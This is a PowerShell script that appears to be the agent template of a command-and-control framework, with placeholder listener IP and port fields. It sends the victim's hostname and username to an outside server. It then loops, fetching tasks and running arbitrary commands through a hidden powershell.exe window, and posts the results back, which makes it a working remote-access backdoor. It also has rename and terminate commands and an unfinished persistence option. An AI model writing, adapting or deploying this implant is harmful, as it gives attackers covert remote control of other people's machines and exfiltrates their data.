$ip   = "{{LISTENER_IP}}"
$port = "{{LISTENER_PORT}}"
$sleep_time = 3
$name = ""

$hname = [System.Net.Dns]::GetHostName()
$uname = whoami
$regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg")
$data  = @{
    hname = "$hname"
    uname = "$uname"
}
$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content

$resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
$renamel = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")
$taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

function shell($fname, $arg){
    
    $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName               = $fname
    $pinfo.RedirectStandardError  = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute        = $false
    $pinfo.CreateNoWindow         = $true;
    $pinfo.Arguments              = $arg
    $p                            = New-Object System.Diagnostics.Process
    $p.StartInfo                  = $pinfo
    
    $p.Start() | Out-Null
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    $p.WaitForExit()
    
    if (-Not $stderr) {
        $res = $stdout
    } else {
        $res = "$stdout`n$stderr"
    }

    $res
}

for (;;){
    $task  = (Invoke-WebRequest -UseBasicParsing -Uri $taskl -Method 'GET').Content
    
    if (-Not [string]::IsNullOrEmpty($task)){
        $task = $task.split()
        $command = $task[0]
        $args = $task[1..$task.Length]

        if ($command -eq "shell") {
            $f    = "powershell.exe"
            $arg  = "/c "
                    
            foreach ($a in $args){ $arg += $a + " " }

            $res  = shell $f $arg
            $data = @{result = "$res"}
                        
            Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
        } elseif ($command -eq "rename") {
            $url = ("http" + ':' + "//$ip" + ':' + "$port/rename/$name")

            $name = $task[1]

            $data = @{name = "$name"}
            Invoke-WebRequest -UseBasicParsing -Uri $url -Body $data -Method 'POST'

            $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/$name")
            $taskl   = ("http" + ':' + "//$ip" + ':' + "$port/tasks/$name")

        } elseif ($command -eq "persist"){
	        # TODO: persistence
	        exit
        } elseif ($command -eq "download"){
	        Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body  @{result = "Terminating..."} -Method 'POST'
	        exit
        } elseif ($command -eq "terminate"){
	        exit
        }
    }
    
    sleep $sleep_time
}